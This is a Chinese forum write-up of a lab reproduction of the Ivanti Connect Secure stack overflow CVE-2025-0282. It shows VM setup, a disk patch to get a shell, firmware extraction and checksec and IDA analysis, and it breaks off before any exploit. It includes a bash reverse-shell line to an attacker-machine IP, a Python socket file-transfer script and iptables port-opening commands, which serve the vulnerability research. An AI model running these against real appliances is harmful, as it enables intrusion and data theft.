
# [漏洞分析] Ivanti Connect Secure栈溢出漏洞(CVE-2025-0282)复现全流程

- 原帖: https://www.52pojie.cn/forum.php?mod=viewthread&tid=2067611
- 抓取时间: 2026-11-01T21:51:14

## 配置环境

下载好虚拟机文件后导入虚拟机中，会进行初始化（需要把虚拟机的网络连接改为NAT模式），中间需要回答一些问题

首先是最官方的问题：询问我们是否同意许可协议的条款，回答`y`即可。然后是询问我们是否选择此虚拟设备作为专用许可服务器。

![](https://attach.52pojie.cn/forum/202601/25/200832rgz16inuc17tvr4u.png)

Pasted image 20260125195714.png (54.14 KB, 下载次数: 0)

[href="forum.php?mod=attachment&aid=MjgyOTQ3NHxmZmEzZGZlNHwxNzkzNTY5ODcyfDE2ODA4NnwyMDY3NjEx&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjgyOTQ3NHxmZmEzZGZlNHwxNzkzNTY5ODcyfDE2ODA4NnwyMDY3NjEx&nothumb=yes)

图一

2026-1-25 20:08 上传

然后是设置账号密码，以及一些名称，以及一些随机字符来增强系统的随机密钥生成器，直接回车就好

![](https://attach.52pojie.cn/forum/202601/25/200915qm45c7mpswzjxmuu.png)

Pasted image 20260125195731.png (105.85 KB, 下载次数: 0)

[href="forum.php?mod=attachment&aid=MjgyOTQ3NXw1NDFjMzU3ZnwxNzkzNTY5ODcyfDE2ODA4NnwyMDY3NjEx&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjgyOTQ3NXw1NDFjMzU3ZnwxNzkzNTY5ODcyfDE2ODA4NnwyMDY3NjEx&nothumb=yes)

图二

2026-1-25 20:09 上传

回车后

显示有系统命令但是并不是正常的`shell`。

![](https://attach.52pojie.cn/forum/202601/25/201013nxox8h3xy3y1uk8m.png)

Pasted image 20260125195801.png (381.58 KB, 下载次数: 0)

[href="forum.php?mod=attachment&aid=MjgyOTQ3N3w4YjY0ZjY4NnwxNzkzNTY5ODcyfDE2ODA4NnwyMDY3NjEx&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjgyOTQ3N3w4YjY0ZjY4NnwxNzkzNTY5ODcyfDE2ODA4NnwyMDY3NjEx&nothumb=yes)

图四

2026-1-25 20:10 上传

这里有两种方式来获取固件，一种是通过逆向分析固件的启动过程解密；另一种是修改虚拟机内存中的代码或数据。

这里我们使用第二种，在虚拟机进入到上述选择页面后，不要做任何操作，等待它显示超时。

![](https://attach.52pojie.cn/forum/202601/25/201202o6v6va0t2am46t66.png)

Pasted image 20260125195814.png (109.26 KB, 下载次数: 0)

[href="forum.php?mod=attachment&aid=MjgyOTQ4MXwyNjU3ODU5MXwxNzkzNTY5ODcyfDE2ODA4NnwyMDY3NjEx&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjgyOTQ4MXwyNjU3ODU5MXwxNzkzNTY5ODcyfDE2ODA4NnwyMDY3NjEx&nothumb=yes)

图五

2026-1-25 20:12 上传

拍摄快照，这个时候如果回车的话，仍然会执行上面的选择，这是因为这个时候回车执行的仍然是设定好的程序`/home/bin/dsconfig.pl`，使用`010`对虚拟机文件进行修改，将`/home/bin/dsconfig.pl`修改为`///////////////bin/sh`。

![](https://attach.52pojie.cn/forum/202601/25/201228ymqoaou9u6uumm90.png)

Pasted image 20260125195830.png (448.92 KB, 下载次数: 0)

[href="forum.php?mod=attachment&aid=MjgyOTQ4Mnw2NmFjZWQ0OHwxNzkzNTY5ODcyfDE2ODA4NnwyMDY3NjEx&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjgyOTQ4Mnw2NmFjZWQ0OHwxNzkzNTY5ODcyfDE2ODA4NnwyMDY3NjEx&nothumb=yes)

图6

2026-1-25 20:12 上传

修改完成后回到虚拟机，恢复快照回车就可以获取到`shell`了。

![](https://attach.52pojie.cn/forum/202601/25/201231xjcmvjmrqi35u45z.png)

Pasted image 20260125195849.png (118.05 KB, 下载次数: 0)

[href="forum.php?mod=attachment&aid=MjgyOTQ4M3xhZTE3MDg0MnwxNzkzNTY5ODcyfDE2ODA4NnwyMDY3NjEx&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjgyOTQ4M3xhZTE3MDg0MnwxNzkzNTY5ODcyfDE2ODA4NnwyMDY3NjEx&nothumb=yes)

图7

2026-1-25 20:12 上传

这里执行输入命令有点麻烦，可以反弹`shell`到我们的攻击机上进行固件提取。

```
bash -i >& /dev/tcp/192.168.201.158/6000 0>&1

> 
```

吐个槽，这玩意内核写的是真谨慎，好多命令都没有，`python`版本还是`python2`的。

有`python2`的环境，使用`python2`启动`http`服务也可以，

```
python -m SimpleHTTPServer 8000
```

但是运行会报错

![](https://attach.52pojie.cn/forum/202601/25/201424ljhqylxr7qyyzbm0.png)

Pasted image 20260125195908.png (392.34 KB, 下载次数: 0)

[href="forum.php?mod=attachment&aid=MjgyOTQ4N3w1YzYxZThkM3wxNzkzNTY5ODcyfDE2ODA4NnwyMDY3NjEx&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjgyOTQ4N3w1YzYxZThkM3wxNzkzNTY5ODcyfDE2ODA4NnwyMDY3NjEx&nothumb=yes)

图8

2026-1-25 20:14 上传

看起来是库文件损坏，访问对应的网页也没有响应

![](https://attach.52pojie.cn/forum/202601/25/201238ylsla6rr674chz6h.png)

Pasted image 20260125195924.png (65.38 KB, 下载次数: 0)

[href="forum.php?mod=attachment&aid=MjgyOTQ4NXxkYzQzYWE4NXwxNzkzNTY5ODcyfDE2ODA4NnwyMDY3NjEx&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjgyOTQ4NXxkYzQzYWE4NXwxNzkzNTY5ODcyfDE2ODA4NnwyMDY3NjEx&nothumb=yes)

图9

2026-1-25 20:12 上传

其实这里是因为端口没有放行并不是库的问题，可以查看当前放行端口，选择以开放的端口进行传输，也可以单独开一个端口来进行传输

```
iptables -L -n  #查看当前服务器放行的端口

iptables -A INPUT -p tcp --dport 8000 -j ACCEPT   #添加放行端口8000
```

添加完成后再次使用`python`启动`http`即可正常访问。

![](https://attach.52pojie.cn/forum/202601/25/201529v9aftayiyyl1fsja.png)

Pasted image 20260125195958.png (80.99 KB, 下载次数: 0)

[href="forum.php?mod=attachment&aid=MjgyOTQ4OHwyODc0Mjk5NnwxNzkzNTY5ODcyfDE2ODA4NnwyMDY3NjEx&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjgyOTQ4OHwyODc0Mjk5NnwxNzkzNTY5ODcyfDE2ODA4NnwyMDY3NjEx&nothumb=yes)

图11

2026-1-25 20:15 上传

下载我们需要的文件即`/home/bin`下的`web`就可以获得我们所需要分析的文件了。仅仅有这个还不够我们还需要一些其他东西来帮助我们进行调试，上传`gdbserver`到目标机器上方便我们后续调试,因为命令的确实这里只能选择在`/tmp`目录下使用`python`脚本来进行传输了。

接受脚本:

```
cat > 2.py 
```

什么你问我为什么是`cat`写入文件？？那还不是因为目标机器上没有`vim`、`echo`、甚至连`vi`都没有。

![](https://img.remit.ee/api/file/BQACAgUAAyEGAASHRsPbAAEDtJdo-foxsbgojkryIZDUZRfcuhzflQACghgAAlO70FfTAAEVHnNvsJQ2BA.jpg)

除了`cat`写入文件没有想到其他办法。

发送端：

```
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.201.169', 8888))
with open("文件地址", 'rb') as file:
      content = file.read()
s.sendall(content)
s.close()
```

运行的时候先开启监听端，在开启发送端即可。

![](https://attach.52pojie.cn/forum/202601/25/201532iq51vh8c0vqfhca0.png)

Pasted image 20260125200027.png (134.5 KB, 下载次数: 0)

[href="forum.php?mod=attachment&aid=MjgyOTQ4OXxjMmYyNTM5MHwxNzkzNTY5ODcyfDE2ODA4NnwyMDY3NjEx&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjgyOTQ4OXxjMmYyNTM5MHwxNzkzNTY5ODcyfDE2ODA4NnwyMDY3NjEx&nothumb=yes)

图12

2026-1-25 20:15 上传

## 开始分析

下载完对应的程序后，先`check`一下看看

```
➜ checksec web  Checking for new versions of pwntools

    To disable this functionality, set the contents of /home/p0ach1l/.cache/.pwntools-cache-3.10/update to 'never' (old way).

    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):

        [update]

        interval=never

[!] An issue occurred while checking PyPI You have the latest version of Pwntools (4.13.0) '/home/p0ach1l/Desktop/test/web'

    Arch:       i386-32-little

    RELRO:      Partial RELRO

    Stack:      No canary found

    NX:         NX enabled

    PIE:        PIE enabled

    RPATH:      b'/home/ecbuilds/int-rel/sa/22.7/bld3431.1/install/lib'
```

可以看出这是一个一个 32 位小端序 的二进制文件（数据在内存中低位地址在前）`RELRO`保护机制部分开启（`GOT`表可写，可能存在`GOT`覆盖攻击风险）；没有开启栈保护（存在栈溢出的话更容易利用）；`NX`开启了，堆栈等数据区域不能执行代码，在栈上直接执行`shellcode`不太可能了，要构造`ROP`链；地址随机化开启了，程序加载到内存时的基地址随机，利用前需要先泄露内存地址来确定真实基址。

> 

对于不太了解`PWN`知识的人来说可能有点看不懂，这里简单补充一下这几个保护机制方便理解:

1.`RELRO`（重定位只读）：是一种保护二进制程序安全的技术，主要目的是防止修改程序的全局偏移表（`GOT`），简单理解就是把“重要的电话号码本”(`GOT`表)锁起来,以此来防止黑客修改程序要调用的函数地址。

2.`Stack Canary`(栈金丝雀):是一种在栈上插入特殊检测值的技术，用于检测和防止栈溢出攻击。可以看成是在栈上放了一个“警报器/金丝雀”，如果栈被溢出破坏，警报就会进行告警，程序崩溃/结束。

3.`NX`(数据不可执行)：一种内存保护技术，将数据内存区域标记为不可执行，防止在栈、堆等数据区域运行恶意代码。简单的讲就是把数据区域标记成只能读，这样在利用的时候及时将我们的恶意代码写进去也不能运行。

4.`PIE`(地址随机化)：`PIE`是一种地址空间布局随机化技术，使得可执行文件在每次加载时都使用随机的基地址。每次启动程序时，把代码随机放在内存的不同位置，让我们无法知道具体的固定地址。给我们带来一点小麻烦。举个简单的例子，植物大战僵尸应该都玩过，`PIE`的作用就相当于我们每次进同一个关卡时第一只僵尸出现的路线是否被固定，如果被固定那么不管我们进几次所有的僵尸和出场顺序都是被固定好的，闯关将会变的日常简单，如果不固定则跟我们现在玩到的差不多，同一个关卡第一次进入和第二次进入僵尸的路线和出场顺序都不一样，以此增加游戏难度。

介绍完四种保护机制，再来看我们`checksec`出来的内容就容易理解多了。

当然如果你懒得看或者感觉看完还是一知半解可以看下面下面的例子

> 

举个更简单好懂的例子：

可以将其想象成一座城堡，其中`RELRO`是城门守卫(目标只有部分守卫）;`Canary`是地面压力传感器（目标没有安装）;`NX`是城墙防爬装置（目标已安装）； `PIE`是城堡位置随机移动（目标随机移动）。一句话总结这个程序就像：有坚固的城墙（`NX`），但大门没锁好（`RELRO`），没有警报系统（`Canary`），城堡地址不固定会随机移动（`PIE`）

看完`checksec`的内容,接下来就该看看我们的`IDA`反编译出来的结果了。

![](https://attach.52pojie.cn/forum/202601/25/201734mnii9pxrn2zznfpz.png)

Pasted image 20260125200057.png (212.66 KB, 下载次数: 0)

[href="forum.php?mod=attachment&aid=MjgyOTQ5M3xhODYxNzY1MXwxNzkzNTY5ODcyfDE2ODA4NnwyMDY3NjEx&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjgyOTQ5M3xhODYxNzY1MXwxNzkzNTY5ODcyfDE2ODA4NnwyMDY3NjEx&nothumb=yes)

图13

2026-1-25 20:17 上传

拖入`IDA`中开始进行分析，`F5`进入反编译后的界面，存在大量的函数，先看看`main`函数中内容

逻辑非常简单，主要作用是将程序的参数传递给另一个函数`sub_89D30`并返回其执行结果。跟进分析一下发现没有成功反编译掉，简单看一下汇编代码
